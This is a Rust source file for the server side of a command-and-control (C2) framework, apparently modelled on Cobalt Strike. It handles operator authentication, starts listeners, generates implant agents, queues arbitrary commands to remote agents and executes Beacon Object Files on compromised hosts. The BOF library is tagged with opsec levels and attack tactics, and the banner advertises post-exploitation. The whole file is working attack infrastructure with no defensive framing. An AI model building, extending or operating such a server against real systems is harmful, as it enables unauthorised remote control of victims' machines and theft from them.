// src/server.rs - Complete BOF Integration (Fixed)
use std::sync::{Arc, Mutex};
use std::net::SocketAddr;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use serde::{Serialize, Deserialize};
use clap::Parser;
use log::{info, error, warn};

// Import your existing modules
mod listener;
mod agent;
mod bof;
mod crypto;
mod models;
mod utils;

use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, set_result_callback};
use agent::{AgentGenerator, AgentConfig};
use bof::{BofManager, BofCommandParser, BofMetadata};
use models::agent::Agent;

// Command-line arguments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address to bind the server to
    #[arg(default_value = "0.0.0.0")]
    ip_address: String,

    /// Password for authentication
    #[arg(required = true)]
    password: String,

    /// Port to listen on
    #[arg(short, long, default_value_t = 50050)]
    port: u16,
}

// Complete message types with BOF support
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClientMessage {
    // Authentication
    Authenticate { password: String },
    
    // Listener management
    AddListener { config: ListenerConfig },
    StartListener { id: usize },
    StopListener { id: usize },
    GetListeners,
    
    // Agent management
    GenerateAgent { config: AgentConfig },
    GetAgents,
    ExecuteCommand { agent_id: String, command: String },
    
    // Enhanced BOF support
    ExecuteBofByName { bof_name: String, args: String, target: String },
    GetBofLibrary,
    GetBofHelp { bof_name: String },
    SearchBofs { query: String },
    GetBofStats,
}

// Complete server message types
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerMessage {
    // Authentication
    AuthResult { success: bool, message: String },
    
    // Listener updates
    ListenersUpdate { listeners: Vec<ListenerInfo> },
    
    // Agent updates
    AgentsUpdate { agents: Vec<Agent> },
    CommandResult { agent_id: String, task_id: String, command: String, output: String, success: bool },
    
    // BOF responses
    BofLibrary { bofs: Vec<serde_json::Value> },
    BofHelp { bof_name: String, help_text: String },
    BofSearchResults { results: Vec<serde_json::Value> },
    BofStats { stats: HashMap<String, u64> },
    
    // General responses
    Error { message: String },
    Success { message: String },
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ListenerInfo {
    pub id: usize,
    pub config: ListenerConfig,
    pub running: bool,
}

// Enhanced server state with BOF support
struct ServerState {
    listeners: Vec<Listener>,
    agent_generator: AgentGenerator,
    bof_manager: BofManager,
    clients: HashMap<String, mpsc::Sender<ServerMessage>>,
    password: String,
}

impl ServerState {
    fn new(password: String) -> Self {
        ServerState {
            listeners: Vec::new(),
            agent_generator: AgentGenerator::new(),
            bof_manager: BofManager::new(),
            clients: HashMap::new(),
            password,
        }
    }

    fn get_listener_info(&self) -> Vec<ListenerInfo> {
        self.listeners
            .iter()
            .enumerate()
            .map(|(id, listener)| ListenerInfo {
                id,
                config: listener.config.clone(),
                running: listener.is_running(),
            })
            .collect()
    }

    fn add_listener(&mut self, config: ListenerConfig) -> Result<(), String> {
        let listener = Listener::new(config);
        self.listeners.push(listener);
        Ok(())
    }

    fn start_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].start().map_err(|e| e.to_string())
    }

    fn stop_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].stop().map_err(|e| e.to_string())
    }

    fn generate_agent(&mut self, config: AgentConfig) -> Result<(), String> {
        self.agent_generator.generate(config).map_err(|e| e.to_string())
    }

    fn execute_bof_by_name(&mut self, bof_name: &str, args: &str, target: &str) -> Result<String, String> {
        println!("🎯 Enhanced BOF execution: {} with args '{}' on target '{}'", bof_name, args, target);

        if target == "local" {
            // Local execution for testing
            match self.bof_manager.execute_bof(bof_name, args, target) {
                Ok(context) => {
                    println!("✅ Local BOF execution successful");
                    let output = String::from_utf8_lossy(&context.beacon_output);
                    if !output.is_empty() {
                        println!("Output: {}", output);
                    }
                    Ok(format!("Local BOF '{}' executed successfully in {}ms", bof_name, context.execution_time_ms))
                },
                Err(e) => {
                    eprintln!("❌ Local BOF execution failed: {}", e);
                    Err(e.to_string())
                }
            }
        } else {
            // Remote execution - queue BOF command for agent
            let bof_command = format!("bof {} {}", bof_name, args);
            add_task_for_agent(target, bof_command);
            println!("📋 BOF task queued for agent: {}", target);
            Ok(format!("BOF '{}' queued for execution on agent '{}'", bof_name, target))
        }
    }

    /// Get BOF library information
    fn get_bof_library(&self) -> Vec<serde_json::Value> {
        let bofs = self.bof_manager.list_bofs();
        bofs.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "version": bof.version,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques,
                "execution_time_estimate": bof.execution_time_estimate,
                "file_path": bof.file_path,
                "usage_examples": bof.usage_examples
            }))
            .collect()
    }

    /// Get BOF help text
    fn get_bof_help(&self, bof_name: &str) -> String {
        if let Some(metadata) = self.bof_manager.get_bof(bof_name) {
            BofCommandParser::generate_help_text(metadata)
        } else {
            format!("BOF '{}' not found in library", bof_name)
        }
    }

    /// Search BOFs by query
    fn search_bofs(&self, query: &str) -> Vec<serde_json::Value> {
        let results = self.bof_manager.search_bofs(query);
        results.into_iter()
            .map(|bof| serde_json::json!({
                "name": bof.name,
                "description": bof.description,
                "author": bof.author,
                "opsec_level": bof.opsec_level,
                "tactics": bof.tactics,
                "techniques": bof.techniques
            }))
            .collect()
    }

    /// Get BOF execution statistics
    fn get_bof_stats(&self) -> HashMap<String, u64> {
        self.bof_manager.get_stats()
    }

    fn get_client_senders(&self) -> Vec<mpsc::Sender<ServerMessage>> {
        self.clients.values().cloned().collect()
    }
}

// Enhanced client handler with comprehensive BOF support
async fn handle_client(
    stream: TcpStream, 
    addr: SocketAddr,
    state: Arc<Mutex<ServerState>>,
) {
    info!("🔗 New client connected: {}", addr);

    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(1000);
    let mut buffer = [0u8; 8192];
    let mut authenticated = false;

    // Add client to server state
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(addr.to_string(), client_tx.clone());
    }

    // Set up callback for command results
    let client_tx_clone = client_tx.clone();
    set_result_callback(move |agent_id, task_id, command, output, success| {
        println!("📡 SERVER: Callback received result for agent {}", agent_id);
        
        let msg = ServerMessage::CommandResult {
            agent_id,
            task_id,
            command,
            output,
            success,
        };
        
        if let Err(e) = client_tx_clone.try_send(msg) {
            println!("❌ SERVER: Failed to send result to client: {}", e);
        } else {
            println!("✅ SERVER: Successfully sent result to client");
        }
    });

    // Split the stream
    let (mut read_half, mut write_half) = stream.into_split();

    // Set up client sender task
    let addr_clone = addr;
    let receiver_task = tokio::spawn(async move {
        while let Some(msg) = client_rx.recv().await {
            let data = bincode::serialize(&msg).unwrap();
            let len = data.len() as u32;

            if write_half.write_all(&len.to_be_bytes()).await.is_err() {
                break;
            }
            if write_half.write_all(&data).await.is_err() {
                break;
            }
            if write_half.flush().await.is_err() {
                break;
            }
        }
        info!("📤 Client sender task ended for {}", addr_clone);
    });

    // Main client handling loop
    loop {
        // Read message length
        let mut len_bytes = [0u8; 4];
        match read_half.read_exact(&mut len_bytes).await {
            Ok(_) => {},
            Err(_) => break,
        }

        let len = u32::from_be_bytes(len_bytes) as usize;
        if len > buffer.len() {
            error!("❌ Message too large from client {}", addr);
            break;
        }

        // Read message
        match read_half.read_exact(&mut buffer[0..len]).await {
            Ok(_) => {},
            Err(_) => break,
        }

        // Deserialize message
        let msg: ClientMessage = match bincode::deserialize(&buffer[0..len]) {
            Ok(msg) => msg,
            Err(e) => {
                error!("❌ Failed to deserialize message from {}: {}", addr, e);
                continue;
            }
        };

        // Handle messages
        match msg {
            ClientMessage::Authenticate { password } => {
                let (success, message, listeners_update, agents_update) = {
                    let state = state.lock().unwrap();
                    let success = password == state.password;
                    let message = if success { 
                        "✅ Authentication successful".to_string() 
                    } else { 
                        "❌ Invalid password".to_string() 
                    };
                    
                    let listeners_update = if success {
                        Some(ServerMessage::ListenersUpdate { 
                            listeners: state.get_listener_info() 
                        })
                    } else { None };
                    
                    let agents_update = if success {
                        Some(ServerMessage::AgentsUpdate { 
                            agents: get_all_agents() 
                        })
                    } else { None };
                    
                    (success, message, listeners_update, agents_update)
                };
                
                authenticated = success;
                
                if let Err(e) = client_tx.send(ServerMessage::AuthResult { success, message }).await {
                    error!("❌ Failed to send auth result to {}: {}", addr, e);
                    break;
                }
                
                if authenticated {
                    if let Some(update) = listeners_update {
                        let _ = client_tx.send(update).await;
                    }
                    if let Some(update) = agents_update {
                        let _ = client_tx.send(update).await;
                    }
                }
            },

            // Require authentication for all other messages
            _ if !authenticated => {
                let _ = client_tx.send(ServerMessage::Error { 
                    message: "❌ Not authenticated".to_string() 
                }).await;
                continue;
            },

            ClientMessage::AddListener { config } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.add_listener(config);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Listener added".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to add listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StartListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.start_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} started", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to start listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StopListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.stop_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} stopped", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to stop listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::GetListeners => {
                let listeners = {
                    let state = state.lock().unwrap();
                    state.get_listener_info()
                };
                let _ = client_tx.send(ServerMessage::ListenersUpdate { listeners }).await;
            },

            ClientMessage::GenerateAgent { config } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.generate_agent(config)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Agent generated".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to generate agent: {}", e) },
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::GetAgents => {
                let agents = get_all_agents();
                let _ = client_tx.send(ServerMessage::AgentsUpdate { agents }).await;
            },

            ClientMessage::ExecuteCommand { agent_id, command } => {
                // Enhanced command execution with BOF parsing
                if let Some((bof_name, args)) = BofCommandParser::parse_bof_command(&command) {
                    info!("🎯 Parsed BOF command: {} with args '{}'", bof_name, args);
                    
                    let result = {
                        let mut state = state.lock().unwrap();
                        state.execute_bof_by_name(&bof_name, &args, &agent_id)
                    };
                    
                    let response = match result {
                        Ok(message) => ServerMessage::Success { message },
                        Err(e) => ServerMessage::Error { 
                            message: format!("❌ Failed to queue BOF: {}", e) 
                        },
                    };
                    
                    if let Err(e) = client_tx.send(response).await {
                        error!("❌ Failed to send response to {}: {}", addr, e);
                        break;
                    }
                } else {
                    // Regular command execution
                    println!("🎯 SERVER: Execute command '{}' for agent '{}'", command, agent_id);
                    
                    let task_id = add_task_for_agent(&agent_id, command.clone());
                    println!("📋 SERVER: Created task {} for agent {}", task_id, agent_id);
                    
                    let response = ServerMessage::Success { 
                        message: format!("📤 Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
                    };
                    
                    if let Err(e) = client_tx.send(response).await {
                        error!("❌ Failed to send response to {}: {}", addr, e);
                        break;
                    }
                }
            },

            ClientMessage::ExecuteBofByName { bof_name, args, target } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.execute_bof_by_name(&bof_name, &args, &target)
                };
                
                let response = match result {
                    Ok(message) => ServerMessage::Success { message },
                    Err(e) => ServerMessage::Error { 
                        message: format!("❌ Failed to execute BOF '{}': {}", bof_name, e) 
                    },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send response to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofLibrary => {
                let bofs = {
                    let state = state.lock().unwrap();
                    state.get_bof_library()
                };
                
                let response = ServerMessage::BofLibrary { bofs };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF library to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofHelp { bof_name } => {
                let help_text = {
                    let state = state.lock().unwrap();
                    state.get_bof_help(&bof_name)
                };
                
                let response = ServerMessage::BofHelp { 
                    bof_name: bof_name.clone(), 
                    help_text 
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF help to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::SearchBofs { query } => {
                let results = {
                    let state = state.lock().unwrap();
                    state.search_bofs(&query)
                };
                
                let response = ServerMessage::BofSearchResults { results };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF search results to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofStats => {
                let stats = {
                    let state = state.lock().unwrap();
                    state.get_bof_stats()
                };
                
                let response = ServerMessage::BofStats { stats };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF stats to {}: {}", addr, e);
                    break;
                }
            },
        }
    }

    // Cleanup
    receiver_task.abort();
    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&addr.to_string());
    }
    info!("🔌 Client disconnected: {}", addr);
}

// Generate teamserver script
fn generate_teamserver_script(ip: &str, port: u16, password: &str) -> std::io::Result<()> {
    let script_content = format!(
        r#"#!/bin/bash
# Enhanced C2 Framework Teamserver Script with BOF Support

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

echo "🚀 Starting Enhanced C2 Server with BOF Support"
echo "📡 Server: {}:{}"
echo "🔥 BOF System: Enabled"
echo "📚 BOF Library: ./bofs/"
echo ""

# Start the C2 server
./c2_server {} "{}" --port {}
"#,
        ip, port, ip, password, port
    );

    let mut file = File::create("teamserver")?;
    file.write_all(script_content.as_bytes())?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata("teamserver")?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions("teamserver", perms)?;
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::init();

    // Parse command-line arguments
    let args = Args::parse();

    // Generate teamserver script if it doesn't exist
    if !std::path::Path::new("teamserver").exists() {
        match generate_teamserver_script(&args.ip_address, args.port, &args.password) {
            Ok(_) => info!("✅ Generated teamserver script"),
            Err(e) => warn!("⚠️ Failed to generate teamserver script: {}", e),
        }
    }

    // Create enhanced server state with BOF support
    let state = Arc::new(Mutex::new(ServerState::new(args.password.clone())));

    // Display comprehensive server status
    {
        let server_state = state.lock().unwrap();
        
        println!("🚀 Enhanced C2 Server with BOF Support");
        println!("{}", "=".repeat(60));
        
        // BOF System Status
        let available_bofs = server_state.bof_manager.list_bofs();
        println!("🔥 BOF System Status:");
        println!("📚 Available BOFs: {}", available_bofs.len());
        
        if !available_bofs.is_empty() {
            println!("📋 BOF Library:");
            for bof in &available_bofs {
                println!("  • {} - {} ({})", bof.name, bof.description, bof.opsec_level);
                if !bof.tactics.is_empty() {
                    println!("    Tactics: {}", bof.tactics.join(", "));
                }
            }
        }
        
        println!("{}", "=".repeat(60));
    }

    // Set up TCP listener
    let addr = format!("{}:{}", args.ip_address, args.port).parse::<SocketAddr>()?;
    let listener = TcpListener::bind(&addr).await?;

    println!("🌐 Server Details:");
    println!("📡 Listening on: {}", addr);
    println!("🔑 Password: {}", args.password);
    println!("🔥 BOF Support: Enabled");
    println!("📚 BOF Directory: ./bofs/");
    println!("📋 Callback System: Ready for command results");
    println!("");
    println!("✅ Enhanced C2 Server ready for client connections!");
    println!("🎯 Supported Operations:");
    println!("  • Traditional C2 operations (listeners, agents, commands)");
    println!("  • BOF execution (local and remote)");
    println!("  • InlineExecute-Assembly (.NET assemblies)");
    println!("  • Real-time task management");
    println!("  • Advanced reconnaissance and post-exploitation");

    // Accept connections loop
    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                let state_clone = Arc::clone(&state);
                tokio::spawn(async move {
                    handle_client(stream, addr, state_clone).await;
                });
            }
            Err(e) => {
                error!("❌ Error accepting connection: {}", e);
            }
        }
    }
}